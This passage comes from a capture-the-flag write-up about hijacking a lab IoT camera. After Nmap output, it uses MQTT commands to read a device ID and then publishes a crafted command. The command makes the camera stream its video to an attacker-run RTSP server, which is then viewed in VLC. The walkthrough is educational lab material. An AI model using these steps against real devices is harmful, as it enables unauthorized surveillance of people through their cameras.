<a id="__codelineno-0-126" name="__codelineno-0-126" href="#__codelineno-0-126"></a>42184/tcp filtered unknown
<a id="__codelineno-0-127" name="__codelineno-0-127" href="#__codelineno-0-127"></a>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
<a id="__codelineno-0-128" name="__codelineno-0-128" href="#__codelineno-0-128"></a>SF-Port80-TCP:V=7.93%I=7%D=12/21%Time=63A38984%P=x86_64-pc-linux-gnu%r(Get
<a id="__codelineno-0-129" name="__codelineno-0-129" href="#__codelineno-0-129"></a>SF:Request,291,&quot;HTTP/1\.1\x20405\x20Method\x20Not\x20Allowed\r\nServer:\x2
<a id="__codelineno-0-130" name="__codelineno-0-130" href="#__codelineno-0-130"></a>SF:0WebSockify\x20Python/3\.8\.10\r\nDate:\x20Wed,\x2021\x20Dec\x202022\x2
<a id="__codelineno-0-131" name="__codelineno-0-131" href="#__codelineno-0-131"></a>SF:022:32:37\x20GMT\r\nConnection:\x20close\r\nContent-Type:\x20text/html;
<a id="__codelineno-0-132" name="__codelineno-0-132" href="#__codelineno-0-132"></a>SF:charset=utf-8\r\nContent-Length:\x20472\r\n\r\n&lt;!DOCTYPE\x20HTML\x20PUB
<a id="__codelineno-0-133" name="__codelineno-0-133" href="#__codelineno-0-133"></a>SF:LIC\x20\&quot;-//W3C//DTD\x20HTML\x204\.01//EN\&quot;\n\x20\x20\x20\x20\x20\x20\x
<a id="__codelineno-0-134" name="__codelineno-0-134" href="#__codelineno-0-134"></a>SF:20\x20\&quot;http://www\.w3\.org/TR/html4/strict\.dtd\&quot;&gt;\n&lt;html&gt;\n\x20\x20\x
<a id="__codelineno-0-135" name="__codelineno-0-135" href="#__codelineno-0-135"></a>SF:20\x20&lt;head&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;meta\x20http-equiv=\&quot;Con
<a id="__codelineno-0-136" name="__codelineno-0-136" href="#__codelineno-0-136"></a>SF:tent-Type\&quot;\x20content=\&quot;text/html;charset=utf-8\&quot;&gt;\n\x20\x20\x20\x20\x
<a id="__codelineno-0-137" name="__codelineno-0-137" href="#__codelineno-0-137"></a>SF:20\x20\x20\x20&lt;title&gt;Error\x20response&lt;/title&gt;\n\x20\x20\x20\x20&lt;/head&gt;
<a id="__codelineno-0-138" name="__codelineno-0-138" href="#__codelineno-0-138"></a>SF:\n\x20\x20\x20\x20&lt;body&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;Error\x20
<a id="__codelineno-0-139" name="__codelineno-0-139" href="#__codelineno-0-139"></a>SF:response&lt;/h1&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code:\x20405
<a id="__codelineno-0-140" name="__codelineno-0-140" href="#__codelineno-0-140"></a>SF:&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Message:\x20Method\x20Not\x20A
<a id="__codelineno-0-141" name="__codelineno-0-141" href="#__codelineno-0-141"></a>SF:llowed\.&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code\x20expla
<a id="__codelineno-0-142" name="__codelineno-0-142" href="#__codelineno-0-142"></a>SF:nation:\x20405\x20-\x20Specified\x20method\x20is\x20invalid\x20for\x20t
<a id="__codelineno-0-143" name="__codelineno-0-143" href="#__codelineno-0-143"></a>SF:his\x20resource\.&lt;/p&gt;\n\x20\x20\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&quot;)%r(HTTPOptio
<a id="__codelineno-0-144" name="__codelineno-0-144" href="#__codelineno-0-144"></a>SF:ns,2B9,&quot;HTTP/1\.1\x20501\x20Unsupported\x20method\x20\(&#39;OPTIONS&#39;\)\r\nS
<a id="__codelineno-0-145" name="__codelineno-0-145" href="#__codelineno-0-145"></a>SF:erver:\x20WebSockify\x20Python/3\.8\.10\r\nDate:\x20Wed,\x2021\x20Dec\x
<a id="__codelineno-0-146" name="__codelineno-0-146" href="#__codelineno-0-146"></a>SF:202022\x2022:32:38\x20GMT\r\nConnection:\x20close\r\nContent-Type:\x20t
<a id="__codelineno-0-147" name="__codelineno-0-147" href="#__codelineno-0-147"></a>SF:ext/html;charset=utf-8\r\nContent-Length:\x20500\r\n\r\n&lt;!DOCTYPE\x20HT
<a id="__codelineno-0-148" name="__codelineno-0-148" href="#__codelineno-0-148"></a>SF:ML\x20PUBLIC\x20\&quot;-//W3C//DTD\x20HTML\x204\.01//EN\&quot;\n\x20\x20\x20\x20\
<a id="__codelineno-0-149" name="__codelineno-0-149" href="#__codelineno-0-149"></a>SF:x20\x20\x20\x20\&quot;http://www\.w3\.org/TR/html4/strict\.dtd\&quot;&gt;\n&lt;html&gt;\n\
<a id="__codelineno-0-150" name="__codelineno-0-150" href="#__codelineno-0-150"></a>SF:x20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;meta\x20http-eq
<a id="__codelineno-0-151" name="__codelineno-0-151" href="#__codelineno-0-151"></a>SF:uiv=\&quot;Content-Type\&quot;\x20content=\&quot;text/html;charset=utf-8\&quot;&gt;\n\x20\x20\
<a id="__codelineno-0-152" name="__codelineno-0-152" href="#__codelineno-0-152"></a>SF:x20\x20\x20\x20\x20\x20&lt;title&gt;Error\x20response&lt;/title&gt;\n\x20\x20\x20\x
<a id="__codelineno-0-153" name="__codelineno-0-153" href="#__codelineno-0-153"></a>SF:20&lt;/head&gt;\n\x20\x20\x20\x20&lt;body&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;
<a id="__codelineno-0-154" name="__codelineno-0-154" href="#__codelineno-0-154"></a>SF:Error\x20response&lt;/h1&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20cod
<a id="__codelineno-0-155" name="__codelineno-0-155" href="#__codelineno-0-155"></a>SF:e:\x20501&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Message:\x20Unsupport
<a id="__codelineno-0-156" name="__codelineno-0-156" href="#__codelineno-0-156"></a>SF:ed\x20method\x20\(&#39;OPTIONS&#39;\)\.&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p
<a id="__codelineno-0-157" name="__codelineno-0-157" href="#__codelineno-0-157"></a>SF:&gt;Error\x20code\x20explanation:\x20HTTPStatus\.NOT_IMPLEMENTED\x20-\x20S
<a id="__codelineno-0-158" name="__codelineno-0-158" href="#__codelineno-0-158"></a>SF:erver\x20does\x20not\x20support\x20this\x20operation\.&lt;/p&gt;\n\x20\x20\x2
<a id="__codelineno-0-159" name="__codelineno-0-159" href="#__codelineno-0-159"></a>SF:0\x20&lt;/body&gt;\n&lt;/html&gt;\n&quot;);
<a id="__codelineno-0-160" name="__codelineno-0-160" href="#__codelineno-0-160"></a>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
<a id="__codelineno-0-161" name="__codelineno-0-161" href="#__codelineno-0-161"></a>
<a id="__codelineno-0-162" name="__codelineno-0-162" href="#__codelineno-0-162"></a>NSE: Script Post-scanning.
<a id="__codelineno-0-163" name="__codelineno-0-163" href="#__codelineno-0-163"></a>NSE: Starting runlevel 1 (of 3) scan.
<a id="__codelineno-0-164" name="__codelineno-0-164" href="#__codelineno-0-164"></a>Initiating NSE at 15:33
<a id="__codelineno-0-165" name="__codelineno-0-165" href="#__codelineno-0-165"></a>Completed NSE at 15:33, 0.00s elapsed
<a id="__codelineno-0-166" name="__codelineno-0-166" href="#__codelineno-0-166"></a>NSE: Starting runlevel 2 (of 3) scan.
<a id="__codelineno-0-167" name="__codelineno-0-167" href="#__codelineno-0-167"></a>Initiating NSE at 15:33
<a id="__codelineno-0-168" name="__codelineno-0-168" href="#__codelineno-0-168"></a>Completed NSE at 15:33, 0.00s elapsed
<a id="__codelineno-0-169" name="__codelineno-0-169" href="#__codelineno-0-169"></a>NSE: Starting runlevel 3 (of 3) scan.
<a id="__codelineno-0-170" name="__codelineno-0-170" href="#__codelineno-0-170"></a>Initiating NSE at 15:33
<a id="__codelineno-0-171" name="__codelineno-0-171" href="#__codelineno-0-171"></a>Completed NSE at 15:33, 0.00s elapsed
<a id="__codelineno-0-172" name="__codelineno-0-172" href="#__codelineno-0-172"></a>Read data files from: /usr/bin/../share/nmap
<a id="__codelineno-0-173" name="__codelineno-0-173" href="#__codelineno-0-173"></a>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<a id="__codelineno-0-174" name="__codelineno-0-174" href="#__codelineno-0-174"></a>Nmap done: 1 IP address (1 host up) scanned in 127.98 seconds
</code></pre></div>
MQTT is running on port <code>1883</code>. Mosquito version <code>1.6.9</code> is running.</p>
<p>Subscribe to <code>device/init</code> topic to enumerate the device and obtain the device ID. Alternatively, we can find the device ID from the Nmap output as well: <code>device/init: S2INBJXRDQFDF90VNXU6</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>$ mosquitto_sub -h 10.10.96.87 -t device/init
<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>S2INBJXRDQFDF90VNXU6
</code></pre></div>
<p>Start an RTSP server using <a href="https://github.com/aler9/rtsp-simple-server">rtsp-simple-server</a>.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>$ docker run --rm -it --network=host aler9/rtsp-simple-server
<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>Unable to find image &#39;aler9/rtsp-simple-server:latest&#39; locally
<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>latest: Pulling from aler9/rtsp-simple-server
<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>d7c47958dda1: Pull complete 
<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>Digest: sha256:44ce06f758a74f316ae4d912706c5212af2fb4765137e119ff689c5ec327dc94
<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>Status: Downloaded newer image for aler9/rtsp-simple-server:latest
<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>2022/12/21 22:56:19 INF rtsp-simple-server v0.21.0
<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>2022/12/21 22:56:19 INF [RTSP] listener opened on :8554 (TCP), :8000 (UDP/RTP), :8001 (UDP/RTCP)
<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>2022/12/21 22:56:19 INF [RTMP] listener opened on :1935
<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>2022/12/21 22:56:19 INF [HLS] listener opened on :8888
<a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>2022/12/21 22:56:19 INF [WebRTC] listener opened on :8889
</code></pre></div>
RTSP server running on port <code>8554</code>. </p>
<p>Publish our payload to <code>device/S2INBJXRDQFDF9/cmd</code> topic. The required format based on the source code is <code>{"CMD":"value","URL":"Value"}</code>. We can use a dummy path <code>testpath</code>.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>$ mosquitto_pub -h 10.10.96.87 -t device/S2INBJXRDQFDF9/cmd -m &quot;&quot;&quot;{&quot;cmd&quot;:&quot;10&quot;,&quot;url&quot;:&quot;rtsp://10.10.5.170:8554/testpath&quot;}&quot;&quot;&quot;
</code></pre></div>
<p>RTSP server shows a connection back from the camera.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>2022/12/21 23:11:55 INF [RTSP] [conn 10.10.96.87:41498] opened
<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>2022/12/21 23:11:55 INF [RTSP] [session 9ff80905] created by 10.10.96.87:41498
<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>2022/12/21 23:11:55 INF [RTSP] [session 9ff80905] is publishing to path &#39;testpath&#39;, with UDP, 1 track (H264)
</code></pre></div>
<p>Let's view the stream by running VLC and opening the server path of the locally hosted RTSP server.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>$ vlc rtsp://127.0.0.01:8554/testpath
</code></pre></div>







  
    
  
  


  <aside class="md-source-file">
    
      
  <span class="md-source-file__fact">
    <span class="md-icon" title="Last update">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
    </span>
    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">November 27, 2024</span>
  </span>

    
    
    
    
  </aside>





                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
    
      
      <nav class="md-footer__inner md-grid" aria-label="Footer" >
        
          
          <a href="../day20/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Day 20 - Firmware Reverse Engineering">
            <div class="md-footer__button md-icon">
              
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
            </div>
            <div class="md-footer__title">
              <span class="md-footer__direction">
                Previous
              </span>
              <div class="md-ellipsis">
                Day 20 - Firmware Reverse Engineering
              </div>
            </div>
          </a>
        
        
          
          <a href="../../authenticationbypass/" class="md-footer__link md-footer__link--next" aria-label="Next: Authentication Bypass">
            <div class="md-footer__title">
              <span class="md-footer__direction">
                Next
              </span>
              <div class="md-ellipsis">
                Authentication Bypass
              </div>
            </div>
            <div class="md-footer__button md-icon">
              
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
            </div>
          </a>
        
      </nav>
    
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
    <div class="md-copyright__highlight">
      &copy; 2024 Nouman Noor
    </div>
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
        <div class="md-social">
  
    
    
    
    
      
      
    
    <a href="https://github.com/nanoor" target="_blank" rel="noopener" title="github.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
    </a>
  
    
    
    
    
      
      
    
    <a href="https://ca.linkedin.com/in/nouman-noor-60193727" target="_blank" rel="noopener" title="ca.linkedin.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5m282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "../../../..", "features": ["content.code.annotate", "content.code.copy", "navigation.footer", "navigation.indexes", "navigation.sections", "navigation.tabs", "navigation.top", "navigation.tracking", "search.suggest", "toc.follow"], "search": "../../../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../../../assets/javascripts/bundle.83f73b43.min.js"></script>
      
    
  </body>
</html>